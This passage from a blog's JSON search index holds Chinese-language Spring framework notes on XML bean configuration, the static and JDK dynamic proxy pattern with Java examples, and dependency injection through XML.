XML\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9009\u9879\uff0c\u5206\u522b\u662falias\uff0cbean\uff0cimport\u3002","title":"Spring\u4f7f\u7528XML\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#spring\u4f7f\u7528xml\u914d\u7f6e","text":"","title":"Spring\u4f7f\u7528XML\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#alias","text":"\u7528\u4e8e\u7ed9\u5b58\u5728\u7684bean\u8d77\u522b\u540d\uff0c\u4f8b\u5982\u7ed9user\u8d77\u522b\u540d\u4e3auserNew <alias name= \"user\" alias= \"userNew\" />","title":"alias"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#bean","text":"id: bean\u7684\u552f\u4e00\u6807\u8bc6\u7b26 class: bean\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b8c\u6574\u7c7b\u540d\uff08\u5305\u540d+\u7c7b\u540d\uff09 name: \u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u9017\u53f7\u53d6\u591a\u4e2a\u522b\u540d <bean id= \"hello\" class= \"top.longlone.HelloSpring\" name= \"h1,h2\" > <property name= \"str\" value= \"Spring\" /> </bean>","title":"bean"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#import","text":"\u4e00\u822c\u7528\u4e8e\u56e2\u961f\u5f00\u53d1\u4f7f\u7528\uff0c\u53ef\u4ee5\u5bfc\u5165\u5176\u4ed6\u914d\u7f6e\u6587\u4ef6 <import resource= \"beans.xml\" />","title":"import"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"\u4e86\u89e3\u4e86Spring XML\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9009\u9879\uff0c\u5206\u522b\u662falias\uff0cbean\uff0cimport\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/","tags":["java","spring"],"text":"Spring\u7b80\u4ecb # \u5b98\u7f51 github\u4ed3\u5e93 spring\u4e0b\u8f7d\u5730\u5740 spring\u5b98\u65b9\u6587\u6863 spring\u4e2d\u6587\u6587\u6863 Spring\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7 IOC(\u63a7\u5236\u53cd\u8f6c )\u548c AOP(\u9762\u5411\u5207\u9762\u7f16\u7a0b) \u7684\u6846\u67b6 \u5b66\u4e60\u8def\u7ebf # Spring->SpringMVC->SpringBoot,SpringCloud \u603b\u7ed3 # Spring\u4e3b\u8981\u7684\u7279\u5f81\u662fIOC\u63a7\u5236\u53cd\u8f6c\u548cAOP\u9762\u5411\u5207\u9762\uff0c\u987a\u4fbf\u8bb0\u5f55\u4e0b\u5b98\u7f51\uff0c\u6587\u6863\u7b49\u3002","title":"Spring\u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#spring\u7b80\u4ecb","text":"\u5b98\u7f51 github\u4ed3\u5e93 spring\u4e0b\u8f7d\u5730\u5740 spring\u5b98\u65b9\u6587\u6863 spring\u4e2d\u6587\u6587\u6863 Spring\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7 IOC(\u63a7\u5236\u53cd\u8f6c )\u548c AOP(\u9762\u5411\u5207\u9762\u7f16\u7a0b) \u7684\u6846\u67b6","title":"Spring\u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#\u5b66\u4e60\u8def\u7ebf","text":"Spring->SpringMVC->SpringBoot,SpringCloud","title":"\u5b66\u4e60\u8def\u7ebf"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#\u603b\u7ed3","text":"Spring\u4e3b\u8981\u7684\u7279\u5f81\u662fIOC\u63a7\u5236\u53cd\u8f6c\u548cAOP\u9762\u5411\u5207\u9762\uff0c\u987a\u4fbf\u8bb0\u5f55\u4e0b\u5b98\u7f51\uff0c\u6587\u6863\u7b49\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","tags":["java","spring"],"text":"\u4ee3\u7406\u6a21\u5f0f # \u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f # \u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42 \u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b # \u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406 \u9759\u6001\u4ee3\u7406 # \u89d2\u8272\u5206\u6790 - \u62bd\u8c61\u63a5\u53e3:\u771f\u5b9e\u7c7b\u548c\u4ee3\u7406\u7c7b\u90fd\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 - \u771f\u5b9e\u7c7b:\u88ab\u4ee3\u7406\u7684\u7c7b - \u4ee3\u7406\u7c7b:\u4ee3\u7406\u771f\u5b9e\u7c7b\uff0c\u4e00\u822c\u4ee3\u7406\u540e\u4f1a\u6709\u4e00\u4e9b\u9644\u5c5e\u64cd\u4f5c - \u5ba2\u6237\u7c7b:\u8bbf\u95ee\u4ee3\u7406\u7c7b \u5b9e\u4f8b\u4ee3\u7801 # package top.longlone ; public interface Rent { public void rent (); } package top.longlone ; public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } ```` ``` java package top.longlone ; public class LandlordProxy implements Rent { public Rent landlord ; public LandlordProxy () { this . landlord = new Landlord (); } public void rent () { this . landlord . rent (); System . out . println ( \"\u6536\u4e2d\u4ecb\u8d39\" ); } } ```` ``` java package top.longlone ; public class Client { public static void main ( String [] args ) { Rent landlordProxy = new LandlordProxy (); landlordProxy . rent (); } } \u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9 # \u4f18\u70b9: - \u53ef\u4ee5\u4f7f\u771f\u5b9e\u7c7b\u66f4\u52a0\u7eaf\u7cb9\uff0c\u4e0d\u518d\u9700\u8981\u5173\u6ce8\u4e00\u4e9b\u516c\u5171\u670d\u52a1 - \u5b9e\u73b0\u516c\u5171\u670d\u52a1\u4ea4\u7ed9\u4ee3\u7406\u89d2\u8272\uff0c\u5b9e\u73b0\u4e86\u4e1a\u52a1\u5206\u5de5 - \u5ba2\u6237\u7c7b\u53ea\u80fd\u8bbf\u95ee\u5230\u4ee3\u7406\u7c7b\uff0c\u9690\u85cf\u4e86\u771f\u5b9e\u7c7b - \u65b9\u4fbf\u6269\u5c55\u548c\u96c6\u4e2d\u7ba1\u7406 \u7f3a\u70b9: - \u4ee3\u7406\u7c7b\u548c\u771f\u5b9e\u7c7b\u7684\u5173\u7cfb\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\uff0c\u6240\u4ee5\u4e00\u4e2a\u771f\u5b9e\u7c7b\u5c31\u9700\u8981\u4e00\u4e2a\u4ee3\u7406\u7c7b \u52a8\u6001\u4ee3\u7406 # \u52a8\u6001\u4ee3\u7406\u5206\u4e3a\u4e24\u7c7b:\u57fa\u4e8e\u63a5\u53e3\u7684\u52a8\u6001\u4ee3\u7406\u548c\u57fa\u4e8e\u7c7b\u7684\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u63a5\u53e3: JDK\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u7c7b: cglib - java\u5b57\u8282\u7801\u5b9e\u73b0: javasist \u8fd9\u91cc\u5148\u4e86\u89e3JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406 \u9700\u8981\u4e86\u89e32\u4e2a\u7c7b: - Proxy :\u7528\u4e8e\u521b\u5efa\u4ee3\u7406\u7c7b\u7684\u7c7b - InvocationHandler :\u4ee3\u7406\u5b9e\u4f8b\u8c03\u7528\u65b9\u6cd5\u65f6\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u5728invoke\u65b9\u6cd5\u91cc\u7f16\u5199\u989d\u5916\u4ee3\u7801\u5b9e\u73b0\u9644\u5c5e\u529f\u80fd \u5b9e\u4f8b\u4ee3\u7801 # package top.longlone ; // \u62bd\u8c61\u63a5\u53e3\uff0c\u62bd\u8c61\u51farent\u8fd9\u4e2a\u65b9\u6cd5 public interface Rent { public void rent (); } package top.longlone ; // \u771f\u5b9e\u7c7b\uff0c\u5b9e\u73b0\u4e86rent\u65b9\u6cd5 public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } package top.longlone ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; // \u8fd9\u91cc\u5c06Porxy\u548cInvocationHandler\u5408\u4e8c\u4e3a\u4e00 public class LandlordInvocationHandler implements InvocationHandler { //\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b private Object obj ; public Object getObj () { return obj ; } public void setObj ( Object obj ) { this . obj = obj ; } public LandlordInvocationHandler () { } public LandlordInvocationHandler ( Object obj ) { this . obj = obj ; } // \u83b7\u53d6\u4ee3\u7406\u7c7b public Rent getProxy () { return ( Rent ) Proxy . newProxyInstance ( obj . getClass (). getClassLoader (), obj . getClass (). getInterfaces (), this ); } // \u91cd\u5199InvocationHandler\u7684invoke\u65b9\u6cd5\uff0c\u5728\u8c03\u7528Rent\u63a5\u53e3\u7684\u4efb\u4f55\u65b9\u6cd5\u524d\u524d\u589e\u52a0\u4e00\u53e5\u8f93\u51fa @Override public Object invoke ( Object proxy , Method method , Object [] args ) throws Throwable { System . out . println ( \"Running method: \" + method . getName ()); Object result = method . invoke ( obj , args ); return result ; } } package top.longlone ; public class Client { public static void main ( String [] args ) { // \u521b\u5efa\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b Landlord landlord = new Landlord (); // \u521b\u5efa\u81ea\u5df1\u7f16\u5199\u7684InvocationHandler\uff0c\u5e76\u4f20\u5165\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b LandlordInvocationHandler handler = new LandlordInvocationHandler ( landlord ); // \u83b7\u53d6\u4ee3\u7406\u7c7b Rent landlordProxy = handler . getProxy (); // \u8c03\u7528\u4ee3\u7406\u7c7b\u7684rent\u65b9\u6cd5 landlordProxy . rent (); /* Output: Running method: rent \u79df\u623f\u5b50 */ } } \u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b # \u88c5\u9970\u5668\u6a21\u5f0f\u5173\u6ce8\u4e8e\u5728\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u52a8\u6001\u7684\u6dfb\u52a0\u65b9\u6cd5\uff0c\u7136\u800c\u4ee3\u7406\u6a21\u5f0f\u5173\u6ce8\u4e8e\u63a7\u5236\u5bf9\u5bf9\u8c61\u7684\u8bbf\u95ee\u3002\u6362\u53e5\u8bdd \u8bf4\uff0c\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u7c7b\u53ef\u4ee5\u5bf9\u5b83\u7684\u5ba2\u6237\u9690\u85cf\u4e00\u4e2a\u5bf9\u8c61\u7684\u5177\u4f53\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5e38\u5e38\u5728\u4e00\u4e2a\u4ee3\u7406\u7c7b\u4e2d\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5e76\u4e14\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u88c5\u9970\u5668\u6a21 \u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u7684\u505a\u6cd5\u662f\u5c06\u539f\u59cb\u5bf9\u8c61\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u7ed9\u88c5\u9970\u8005\u7684\u6784\u9020\u5668\u3002 \u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u548c\u771f\u5b9e\u5bf9\u8c61\u4e4b\u95f4\u7684\u7684\u5173\u7cfb\u901a\u5e38\u5728\u7f16\u8bd1\u65f6\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\uff0c\u800c\u88c5\u9970\u8005\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u9012\u5f52\u5730\u88ab\u6784\u9020\u3002 \u603b\u7ed3 # \u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42\uff0c\u5206\u4e3a\u9759\u6001\u4ee3\u7406\u548c\u52a8\u6001\u4ee3\u7406\uff0c\u540c\u65f6\u4e86\u89e3\u4e86JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406\u7684\u7f16\u5199\u3002","title":"\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f","text":"","title":"\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f","text":"\u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42","title":"\u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b","text":"\u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406","title":"\u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u9759\u6001\u4ee3\u7406","text":"\u89d2\u8272\u5206\u6790 - \u62bd\u8c61\u63a5\u53e3:\u771f\u5b9e\u7c7b\u548c\u4ee3\u7406\u7c7b\u90fd\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 - \u771f\u5b9e\u7c7b:\u88ab\u4ee3\u7406\u7684\u7c7b - \u4ee3\u7406\u7c7b:\u4ee3\u7406\u771f\u5b9e\u7c7b\uff0c\u4e00\u822c\u4ee3\u7406\u540e\u4f1a\u6709\u4e00\u4e9b\u9644\u5c5e\u64cd\u4f5c - \u5ba2\u6237\u7c7b:\u8bbf\u95ee\u4ee3\u7406\u7c7b","title":"\u9759\u6001\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u5b9e\u4f8b\u4ee3\u7801","text":"package top.longlone ; public interface Rent { public void rent (); } package top.longlone ; public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } ```` ``` java package top.longlone ; public class LandlordProxy implements Rent { public Rent landlord ; public LandlordProxy () { this . landlord = new Landlord (); } public void rent () { this . landlord . rent (); System . out . println ( \"\u6536\u4e2d\u4ecb\u8d39\" ); } } ```` ``` java package top.longlone ; public class Client { public static void main ( String [] args ) { Rent landlordProxy = new LandlordProxy (); landlordProxy . rent (); } }","title":"\u5b9e\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9","text":"\u4f18\u70b9: - \u53ef\u4ee5\u4f7f\u771f\u5b9e\u7c7b\u66f4\u52a0\u7eaf\u7cb9\uff0c\u4e0d\u518d\u9700\u8981\u5173\u6ce8\u4e00\u4e9b\u516c\u5171\u670d\u52a1 - \u5b9e\u73b0\u516c\u5171\u670d\u52a1\u4ea4\u7ed9\u4ee3\u7406\u89d2\u8272\uff0c\u5b9e\u73b0\u4e86\u4e1a\u52a1\u5206\u5de5 - \u5ba2\u6237\u7c7b\u53ea\u80fd\u8bbf\u95ee\u5230\u4ee3\u7406\u7c7b\uff0c\u9690\u85cf\u4e86\u771f\u5b9e\u7c7b - \u65b9\u4fbf\u6269\u5c55\u548c\u96c6\u4e2d\u7ba1\u7406 \u7f3a\u70b9: - \u4ee3\u7406\u7c7b\u548c\u771f\u5b9e\u7c7b\u7684\u5173\u7cfb\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\uff0c\u6240\u4ee5\u4e00\u4e2a\u771f\u5b9e\u7c7b\u5c31\u9700\u8981\u4e00\u4e2a\u4ee3\u7406\u7c7b","title":"\u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u52a8\u6001\u4ee3\u7406","text":"\u52a8\u6001\u4ee3\u7406\u5206\u4e3a\u4e24\u7c7b:\u57fa\u4e8e\u63a5\u53e3\u7684\u52a8\u6001\u4ee3\u7406\u548c\u57fa\u4e8e\u7c7b\u7684\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u63a5\u53e3: JDK\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u7c7b: cglib - java\u5b57\u8282\u7801\u5b9e\u73b0: javasist \u8fd9\u91cc\u5148\u4e86\u89e3JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406 \u9700\u8981\u4e86\u89e32\u4e2a\u7c7b: - Proxy :\u7528\u4e8e\u521b\u5efa\u4ee3\u7406\u7c7b\u7684\u7c7b - InvocationHandler :\u4ee3\u7406\u5b9e\u4f8b\u8c03\u7528\u65b9\u6cd5\u65f6\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u5728invoke\u65b9\u6cd5\u91cc\u7f16\u5199\u989d\u5916\u4ee3\u7801\u5b9e\u73b0\u9644\u5c5e\u529f\u80fd","title":"\u52a8\u6001\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u5b9e\u4f8b\u4ee3\u7801_1","text":"package top.longlone ; // \u62bd\u8c61\u63a5\u53e3\uff0c\u62bd\u8c61\u51farent\u8fd9\u4e2a\u65b9\u6cd5 public interface Rent { public void rent (); } package top.longlone ; // \u771f\u5b9e\u7c7b\uff0c\u5b9e\u73b0\u4e86rent\u65b9\u6cd5 public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } package top.longlone ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; // \u8fd9\u91cc\u5c06Porxy\u548cInvocationHandler\u5408\u4e8c\u4e3a\u4e00 public class LandlordInvocationHandler implements InvocationHandler { //\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b private Object obj ; public Object getObj () { return obj ; } public void setObj ( Object obj ) { this . obj = obj ; } public LandlordInvocationHandler () { } public LandlordInvocationHandler ( Object obj ) { this . obj = obj ; } // \u83b7\u53d6\u4ee3\u7406\u7c7b public Rent getProxy () { return ( Rent ) Proxy . newProxyInstance ( obj . getClass (). getClassLoader (), obj . getClass (). getInterfaces (), this ); } // \u91cd\u5199InvocationHandler\u7684invoke\u65b9\u6cd5\uff0c\u5728\u8c03\u7528Rent\u63a5\u53e3\u7684\u4efb\u4f55\u65b9\u6cd5\u524d\u524d\u589e\u52a0\u4e00\u53e5\u8f93\u51fa @Override public Object invoke ( Object proxy , Method method , Object [] args ) throws Throwable { System . out . println ( \"Running method: \" + method . getName ()); Object result = method . invoke ( obj , args ); return result ; } } package top.longlone ; public class Client { public static void main ( String [] args ) { // \u521b\u5efa\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b Landlord landlord = new Landlord (); // \u521b\u5efa\u81ea\u5df1\u7f16\u5199\u7684InvocationHandler\uff0c\u5e76\u4f20\u5165\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b LandlordInvocationHandler handler = new LandlordInvocationHandler ( landlord ); // \u83b7\u53d6\u4ee3\u7406\u7c7b Rent landlordProxy = handler . getProxy (); // \u8c03\u7528\u4ee3\u7406\u7c7b\u7684rent\u65b9\u6cd5 landlordProxy . rent (); /* Output: Running method: rent \u79df\u623f\u5b50 */ } }","title":"\u5b9e\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b","text":"\u88c5\u9970\u5668\u6a21\u5f0f\u5173\u6ce8\u4e8e\u5728\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u52a8\u6001\u7684\u6dfb\u52a0\u65b9\u6cd5\uff0c\u7136\u800c\u4ee3\u7406\u6a21\u5f0f\u5173\u6ce8\u4e8e\u63a7\u5236\u5bf9\u5bf9\u8c61\u7684\u8bbf\u95ee\u3002\u6362\u53e5\u8bdd \u8bf4\uff0c\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u7c7b\u53ef\u4ee5\u5bf9\u5b83\u7684\u5ba2\u6237\u9690\u85cf\u4e00\u4e2a\u5bf9\u8c61\u7684\u5177\u4f53\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5e38\u5e38\u5728\u4e00\u4e2a\u4ee3\u7406\u7c7b\u4e2d\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5e76\u4e14\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u88c5\u9970\u5668\u6a21 \u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u7684\u505a\u6cd5\u662f\u5c06\u539f\u59cb\u5bf9\u8c61\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u7ed9\u88c5\u9970\u8005\u7684\u6784\u9020\u5668\u3002 \u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u548c\u771f\u5b9e\u5bf9\u8c61\u4e4b\u95f4\u7684\u7684\u5173\u7cfb\u901a\u5e38\u5728\u7f16\u8bd1\u65f6\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\uff0c\u800c\u88c5\u9970\u8005\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u9012\u5f52\u5730\u88ab\u6784\u9020\u3002","title":"\u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u603b\u7ed3","text":"\u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42\uff0c\u5206\u4e3a\u9759\u6001\u4ee3\u7406\u548c\u52a8\u6001\u4ee3\u7406\uff0c\u540c\u65f6\u4e86\u89e3\u4e86JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406\u7684\u7f16\u5199\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/","tags":["java","spring"],"text":"\u4f9d\u8d56\u6ce8\u5165(DI) # \u6784\u9020\u5668\u6ce8\u5165 # \u53c2\u8003 HelloSpring Set\u65b9\u5f0f\u6ce8\u5165 # \u4f9d\u8d56\u6ce8\u5165 \u4f9d\u8d56: bean\u5bf9\u8c61\u7684\u521b\u5efa\u4f9d\u8d56\u4e8e\u5bb9\u5668 \u6ce8\u5165: bean\u5bf9\u8c61\u4e2d\u7684\u6240\u6709\u5c5e\u6027\u7531\u5bb9\u5668\u6765\u6ce8\u5165 \u6ce8\u5165\u590d\u6742\u7684\u503c # public class Address { private String address ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } public class Student { private Address address ; private String name ; private String [] books ; private List < String > hobbies ; private Map < String , String > card ; private Set < String > games ; private String friend ; private Properties info ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"address\" class= \"top.longlone.Address\" > <property name= \"address\" value= \"https://longlone.top\" /> </bean> <bean id= \"student\" class= \"top.longlone.Student\" > <!--\u666e\u901a\u6ce8\u5165--> <property name= \"name\" value= \"longlone\" /> <!--bean\u6ce8\u5165--> <property name= \"address\" ref= \"address\" /> <!--\u6570\u7ec4\u6ce8\u5165--> <property name= \"books\" > <array> <value> \u8bed\u6587 </value> <value> \u6570\u5b66 </value> <value> \u82f1\u8bed </value> </array> </property> <!--List\u6ce8\u5165--> <property name= \"hobbies\" > <list> <value> \u542c\u6b4c </value> <value> \u6572\u4ee3\u7801 </value> <value> \u5e72\u996d </value> </list> </property> <!--Map\u6ce8\u5165--> <property name= \"card\" > <map> <entry key= \"Boy\" value= \"bbb\" /> <entry key= \"Girl\" value= \"ggg\" /> </map> </property> <!--Set\u6ce8\u5165--> <property name= \"games\" > <set> <value> LOL </value> <value> CF </value> <value> DOTA </value> </set> </property> <!--null\u6ce8\u5165--> <property name= \"friend\" > <null/> </property> <!--Properties\u6ce8\u5165--> <property name= \"info\" > <props> <prop key= \"idcard\" > 2020111111 </prop> <prop key= \"sex\" > 1 </prop> <prop key= \"blog\" > https://longlone.top/ </prop> </props> </property> </bean> </beans> \u6269\u5c55\u6ce8\u5165 # \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2aBean\u5982\u4e0b package top.longlone ; public class User { private String name ; private int age ; // \u7701\u7565getter setter toStirng Constructor\u65b9\u6cd5 } p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165 # p\u5bf9\u5e94\u7684\u662fproperty\uff0c\u5176\u5b9e\u662fSet\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:p=\"http://www.springframework.org/schema/p\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u6ce8\u5165\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981property\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p= \"http://www.springframework.org/schema/p\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" p:age= \"18\" p:name= \"whoami\" /> </beans> c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165 # c\u5bf9\u5e94\u7684\u662fconstructor\uff0c\u5176\u5b9e\u662f\u6784\u9020\u5668\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:c=\"http://www.springframework.org/schema/c\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u8c03\u7528\u6784\u9020\u5668\u76f4\u63a5\u6ce8\u5165\u7c7b\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981constructor-arg\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c= \"http://www.springframework.org/schema/c\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" /> </beans> \u603b\u7ed3 # 